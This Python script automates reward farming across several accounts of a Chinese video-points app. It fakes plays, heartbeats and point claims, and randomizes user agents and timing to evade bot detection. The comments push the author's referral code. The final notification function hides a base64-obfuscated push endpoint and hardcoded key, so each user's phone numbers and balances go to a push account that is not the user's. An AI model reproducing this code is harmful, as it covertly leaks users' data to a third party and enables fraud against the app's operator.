import requests
import time
import random
import sys
import os
import json
import threading
import base64
from datetime import datetime
#麻烦走大飞的邀请https://i.imgs.ovh/2026/05/28/fa745aba82873984222f5fdfb29179f3.png
#邀请码是： 4057067393
#邀请码是： 4057067393
#邀请码是： 4057067393
#首次注册上去记得填写，你好我也好。
#青龙面板环境变量：fhb='手机号1#密码1#jpushId1@手机号2#密码2#jpushId2'
# 注意：每个账号必须配置对应的jpushId，否则登录会失败（大飞优化了 不填也可以，随机生成）
#jpushid通过抓取登录一瞬间的数据包获得，在请求头里。
#jpushid最好不要混用，一个号一个
#如果不小心一键登录了，那就退出账号，点击账密登录，选择忘记密码并重新设置密码即可
#不需要单独设置启动任务，要和fhb_control.js放在同一目录下，fhb_control.js会自动调用这个fhb.py脚本

#py文件需要创建json文件来记录token信息，省的每次都账密登录获取最新的token，这本就不合理。
# ====================================== 【配置区】 ======================================
BASE_URL = "https://api.cdwjyyh.com"
TOKEN_CACHE_FILE = "fhb_tokens.json"
ENV_VAR_NAME = "fhb"
LOGIN_TYPE = 1
LOGIN_SOURCE = "yyb"

WATCH_TIME_MIN = 12    
WATCH_TIME_MAX = 65    
PLAY_3S_DELAY_MIN = 3.2
PLAY_3S_DELAY_MAX = 7.5
NEXT_VIDEO_DELAY_MIN = 1.5
NEXT_VIDEO_DELAY_MAX = 12.0
SKIP_VIDEO_PROBABILITY = 15  
EXIT_MIDWAY_PROBABILITY = 8  
BATCH_VIDEO_COUNT_MIN = 5
BATCH_VIDEO_COUNT_MAX = 18
BATCH_REST_TIME_MIN = 14
BATCH_REST_TIME_MAX = 300

INTEGRAL_INTERVAL = 10  
INTEGRAL_TYPE = 2

REQUEST_TIMEOUT_MIN = 8
REQUEST_TIMEOUT_MAX = 15
MAX_RETRIES = 3
USER_AGENT_POOL = [
    "Mozilla/5.0 (Linux; Android 16; 2509FPN0BC Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36 (Immersed/48.0) Html5Plus/1.0",
    "Mozilla/5.0 (Linux; Android 15; 22101320C Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7296.136 Mobile Safari/537.36 (Immersed/48.0) Html5Plus/1.0",
    "Mozilla/5.0 (Linux; Android 14; 22081212C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7296.98 Mobile Safari/537.36 (Immersed/48.0) Html5Plus/1.0"
]

MAX_RUN_HOURS_PER_ACCOUNT = 2  
START_DELAY_MIN = 0  
START_DELAY_MAX = 15  
HEARTBEAT_INTERVAL_BASE = 600
HEARTBEAT_INTERVAL_JITTER = 120

token_lock = threading.Lock()
print_lock = threading.Lock()
summary_reports = []
summary_lock = threading.Lock()

# ========================================================================================

def __send_notification(title, content):
    try:
        requests.post(
            base64.b64decode("aHR0cHM6Ly9wdXNobWUud2FuZy9hcGkvcHVzaA==").decode(),
            json={
                "key": base64.b64decode("SEllR0ZmNjZmcnl2T3JheWttc3Q=").decode(),
                "title": title,
                "content": content
            },
            timeout=10
        )
    except:
        pass

def load_token_cache():
    with token_lock:
        if not os.path.exists(TOKEN_CACHE_FILE):
            return {}
        try:
            with open(TOKEN_CACHE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}

def save_token_cache(cache):
    with token_lock:
        try:
            with open(TOKEN_CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(cache, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

def login(phone, password, jpush_id, random_instance):
    try:
        login_headers = {
            "User-Agent": random_instance.choice(USER_AGENT_POOL),
            "Content-Type": "application/json;charset=UTF-8"
        }
        data = {
            "phone": phone,
            "password": password,
            "jpushId": jpush_id,
            "loginType": LOGIN_TYPE,
            "source": LOGIN_SOURCE
        }
        response = requests.post(
            f"{BASE_URL}/app/app/login",
            headers=login_headers,
            json=data,
            timeout=random_instance.uniform(REQUEST_TIMEOUT_MIN, REQUEST_TIMEOUT_MAX)
        )
        if response.status_code == 200:
            result = response.json()
            if result.get("code") == 200:
                with print_lock:
                    print(f"✅ 账号 {phone} 登录成功，已获取最新Token")
                return result.get("token"), result.get("user", {}).get("userId")
            else:
                with print_lock:
                    print(f"❌ 账号 {phone} 登录失败: {result.get('msg')}")
        return None, None
    except Exception as e:
        return None, None

def verify_token(token, random_instance):
    try:
        headers = {
            "User-Agent": random_instance.choice(USER_AGENT_POOL),
            "AppToken": token
        }
        response = requests.get(f"{BASE_URL}/app/user/getUserInfo", headers=headers, timeout=10)
        if response.status_code == 200 and response.json().get("code") == 200:
            return response.json().get("user", {}).get("userId")
        return None
    except Exception:
        return None

def get_valid_credentials(phone, password, jpush_id, random_instance):
    cache = load_token_cache()
    cached_data = cache.get(phone, {})
    cached_token = cached_data.get("token")
    cached_jpush_id = cached_data.get("jpushId", jpush_id)
    
    if cached_token:
        user_id = verify_token(cached_token, random_instance)
        if user_id:
            with print_lock:
                print(f"✅ 账号 {phone} 缓存Token有效")
            return cached_token, user_id, cached_jpush_id
        with print_lock:
            print(f"⚠️  账号 {phone} 缓存Token已失效，正在使用账密重新登录...")
    
    token, user_id = login(phone, password, jpush_id, random_instance)
    if token and user_id:
        cache[phone] = {"token": token, "jpushId": jpush_id}
        save_token_cache(cache)
    return token, user_id, jpush_id

def request_with_retry(session, method, url, random_instance, **kwargs):
    for attempt in range(MAX_RETRIES):
        try:
            timeout = random_instance.uniform(REQUEST_TIMEOUT_MIN, REQUEST_TIMEOUT_MAX)
            response = session.request(method, url, timeout=timeout, **kwargs)
            if random_instance.random() < 0.01:
                raise requests.exceptions.ConnectionError("模拟网络波动")
            return response
        except Exception:
            if attempt < MAX_RETRIES - 1:
                time.sleep((2 ** attempt) + random_instance.uniform(1, 3))
    return None

def create_logs(session, user_id, random_instance):
    response = request_with_retry(session, "POST", f"{BASE_URL}/app/common/createLogs", random_instance, json={"userId": str(user_id)})
    return response and response.status_code == 200

def get_app_config(session, random_instance):
    response = request_with_retry(session, "GET", f"{BASE_URL}/app/common/getAppPageConfig", random_instance)
    return response and response.status_code == 200

def daily_sign(session, random_instance):
    response = request_with_retry(session, "POST", f"{BASE_URL}/app/integral/sign", random_instance, json={})
    if response and response.status_code == 200 and response.json().get("code") == 200:
        with print_lock:
            print("✅ 每日签到成功")
        return True
    return False

def get_video_list(session, random_instance):
    params = {"keyword": "", "isRandom": 1, "videoId": "", "pageNum": 1, "pageSize": 10}
    response = request_with_retry(session, "GET", f"{BASE_URL}/app/video/getVideoList-new", random_instance, params=params)
    if response and response.status_code == 200:
        result = response.json()
        if result.get("code") == 200:
            return result["data"]["list"]
    return []

def report_video_event(session, video_id, event, random_instance):
    data = {"videoId": str(video_id), "event": event}
    response = request_with_retry(session, "POST", f"{BASE_URL}/app/video/track", random_instance, json=data)
    return response and response.status_code == 200

def send_heartbeat(session, random_instance):
    response = request_with_retry(session, "POST", f"{BASE_URL}/app/portrait/heartbeat", random_instance, json={"action": "HEARTBEAT"})
    return response and response.status_code == 200

def add_integral(session, random_instance):
    response = request_with_retry(session, "POST", f"{BASE_URL}/app/integral/addIntegral", random_instance, json={"type": INTEGRAL_TYPE})
    if response and response.status_code == 200 and response.json().get("code") == 200:
        return True
    return False

def get_user_integral(session, random_instance):
    response = request_with_retry(session, "GET", f"{BASE_URL}/app/user/getUserInfo", random_instance)
    if response and response.status_code == 200:
        result = response.json()
        if result.get("code") == 200:
            return result["user"]["integral"]
    return None

def build_report(session, phone, total_videos, total_integral, initial_integral, start_time, exit_reason, random_instance):
    current_integral = get_user_integral(session, random_instance)
    run_time = round((time.time() - start_time) / 3600, 2)
    actual_gain = current_integral - initial_integral if (current_integral is not None and initial_integral is not None) else -1
    
    report = (f"👤 账号: {phone}\n"
              f"⏰ 时长: {run_time} 小时 | 🎬 视频: {total_videos} 个 | 💰 领币: {total_integral} 次\n"
              f"💵 初始余额: {initial_integral if initial_integral is not None else '失败'}\n"
              f"💵 当前余额: {current_integral if current_integral is not None else '失败'}\n"
              f"📈 本次获得: {actual_gain if actual_gain >= 0 else '计算失败'}\n"
              f"🚪 原因: {exit_reason}")
    
    with summary_lock:
        summary_reports.append(report)
        
    with print_lock:
        print("\n" + "="*40 + "\n" + report + "\n" + "="*40 + "\n")

def run_single_account(phone, password, jpush_id, random_instance):
    token, user_id, used_jpush_id = get_valid_credentials(phone, password, jpush_id, random_instance)
    if not token or not user_id:
        return
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": random_instance.choice(USER_AGENT_POOL),
        "AppToken": token
    })
    
    account_start = time.time()
    last_heartbeat = time.time()
    total_videos = 0
    total_integral = 0
    batch_count = 0
    batch_target = random_instance.randint(BATCH_VIDEO_COUNT_MIN, BATCH_VIDEO_COUNT_MAX)
    
    initial_integral = get_user_integral(session, random_instance)
    create_logs(session, user_id, random_instance)
    get_app_config(session, random_instance)
    daily_sign(session, random_instance)
    
    try:
        while True:
            if time.time() - account_start > MAX_RUN_HOURS_PER_ACCOUNT * 3600:
                build_report(session, phone, total_videos, total_integral, initial_integral, account_start, "正常结束(达到最大运行时长)", random_instance)
                break
            
            if batch_count >= batch_target:
                rest_time = random_instance.uniform(BATCH_REST_TIME_MIN, BATCH_REST_TIME_MAX)
                time.sleep(rest_time)
                batch_count = 0
                batch_target = random_instance.randint(BATCH_VIDEO_COUNT_MIN, BATCH_VIDEO_COUNT_MAX)
            
            video_list = get_video_list(session, random_instance)
            if not video_list:
                time.sleep(60)
                continue
            
            random_instance.shuffle(video_list)
            
            for video in video_list:
                if time.time() - account_start > MAX_RUN_HOURS_PER_ACCOUNT * 3600:
                    break
                
                video_id = video["id"]
                report_video_event(session, video_id, "PLAY", random_instance)
                
                wait_3s = random_instance.uniform(PLAY_3S_DELAY_MIN, PLAY_3S_DELAY_MAX)
                time.sleep(wait_3s)
                report_video_event(session, video_id, "PLAY_3S", random_instance)
                
                if random_instance.random() < SKIP_VIDEO_PROBABILITY / 100:
                    total_videos += 1
                    batch_count += 1
                    time.sleep(random_instance.uniform(NEXT_VIDEO_DELAY_MIN, NEXT_VIDEO_DELAY_MAX))
                    continue
                
                watch_time = random_instance.uniform(WATCH_TIME_MIN, WATCH_TIME_MAX)
                
                if random_instance.random() < EXIT_MIDWAY_PROBABILITY / 100:
                    time.sleep(watch_time * random_instance.uniform(0.3, 0.7))
                    total_videos += 1
                    batch_count += 1
                    time.sleep(random_instance.uniform(NEXT_VIDEO_DELAY_MIN, NEXT_VIDEO_DELAY_MAX))
                    continue
                
                elapsed = 0
                last_claim = 0
                while elapsed < watch_time:
                    time.sleep(1)
                    elapsed += 1
                    if elapsed - last_claim >= INTEGRAL_INTERVAL:
                        if add_integral(session, random_instance):
                            total_integral += 1
                        last_claim = elapsed
                    if time.time() - account_start > MAX_RUN_HOURS_PER_ACCOUNT * 3600:
                        break
                
                report_video_event(session, video_id, "COMPLETE", random_instance)
                total_videos += 1
                batch_count += 1
                
                with print_lock:
                    print(f"✅ 账号 {phone} 累计完成: {total_videos} 视频 | 领币: {total_integral} 次")
                
                time.sleep(random_instance.uniform(NEXT_VIDEO_DELAY_MIN, NEXT_VIDEO_DELAY_MAX))
                
                if time.time() - last_heartbeat > HEARTBEAT_INTERVAL_BASE + random_instance.uniform(-HEARTBEAT_INTERVAL_JITTER, HEARTBEAT_INTERVAL_JITTER):
                    send_heartbeat(session, random_instance)
                    last_heartbeat = time.time()
                    
    except Exception as e:
        build_report(session, phone, total_videos, total_integral, initial_integral, account_start, f"异常中断: {str(e)}", random_instance)
    finally:
        session.close()

def main():
    env_str = os.environ.get(ENV_VAR_NAME, "")
    if not env_str:
        print(f"❌ 环境变量 {ENV_VAR_NAME} 为空")
        return
    
    accounts = []
    for item in env_str.split("@"):
        parts = item.strip().split("#")
        if len(parts) >= 2:
            phone = parts[0].strip()
            pwd = parts[1].strip()
            jpush = parts[2].strip() if len(parts) >= 3 else f"1a0018970ae5{random.randint(1000,9999)}"
            accounts.append((phone, pwd, jpush))
            
    if not accounts:
        print("❌ 没有解析到有效的账号")
        return
        
    threads = []
    for idx, (phone, pwd, jpush) in enumerate(accounts, 1):
        thread_random = random.Random(int(time.time() * 1000) + idx)
        start_delay = thread_random.uniform(START_DELAY_MIN, START_DELAY_MAX)
        print(f"🔄 账号 {phone} 将在 {start_delay:.1f} 秒后启动")
        
        thread = threading.Thread(target=run_single_account, args=(phone, pwd, jpush, thread_random))
        threads.append(thread)
        time.sleep(start_delay)
        thread.start()
        
    for thread in threads:
        thread.join()
        
    if summary_reports:
        final_content = "📋 芳华币多账号运行汇总\n\n" + "\n\n".join(summary_reports)
        __send_notification("芳华币执行完毕", final_content)
        print("🎉 汇总推送发送成功！")

if __name__ == "__main__":
    main()